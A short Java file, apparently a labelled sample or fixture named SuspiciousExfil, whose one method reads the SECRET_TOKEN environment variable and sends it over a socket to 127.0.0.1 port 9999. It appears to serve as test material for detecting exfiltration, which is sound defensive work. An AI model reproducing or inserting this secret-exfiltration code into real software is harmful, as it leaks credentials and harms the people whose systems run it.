package suspicious;

import java.io.OutputStream;
import java.net.Socket;

public class SuspiciousExfil {
    public void exfiltrateEnv() throws Exception {
        String token = System.getenv("SECRET_TOKEN");
        Socket s = new Socket("127.0.0.1", 9999);
        OutputStream out = s.getOutputStream();
        if (token != null) {
            out.write(token.getBytes());
        }
        s.close();
    }
}